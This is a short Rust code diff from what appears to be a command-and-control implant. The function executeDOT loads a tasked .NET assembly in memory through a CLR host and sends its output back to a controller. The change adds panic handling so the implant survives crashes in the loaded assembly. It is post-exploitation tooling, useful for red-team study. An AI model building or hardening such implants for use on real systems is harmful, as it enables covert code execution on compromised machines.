@@ -57,21 +57,37 @@ pub fn executeDOT(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
     .map(|s| s.to_string())
     .collect();
 
-    let mut clr = Clr::new(file_bytes, args)?;
+    // Run CLR inside catch_unwind so a panic from the loaded assembly
+    // doesn't unwind through the agent and kill the whole process.
+    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| -> Result<String, Box<dyn std::error::Error>> {
+        let mut clr = Clr::new(file_bytes, args)?;
+        let output = clr.run()?;
+        Ok(output)
+    }));
 
-    let results = clr.run()?;
+    let (results, status) = match result {
+        Ok(Ok(output)) => (output, "success"),
+        Ok(Err(e)) => (format!("DOT execution error: {:?}", e), "error"),
+        Err(panic_info) => {
+            let msg = if let Some(s) = panic_info.downcast_ref::<&str>() {
+                format!("DOT execution panicked: {}", s)
+            } else if let Some(s) = panic_info.downcast_ref::<String>() {
+                format!("DOT execution panicked: {}", s)
+            } else {
+                "DOT execution panicked (unknown cause)".to_string()
+            };
+            (msg, "error")
+        }
+    };
 
-    println!("[*] Results:\n\n{}", results);
-
-
-    // 4. Send final response
+    // 4. Send final response — always reached, even on error/panic
     let done = json!({
         "action": "post_response",
         "responses": [{
             "task_id": id,
             "user_output": results,
             "agent_file_id": file_id,
-            "status": "success"
+            "status": status
         }]
     })
     .to_string();
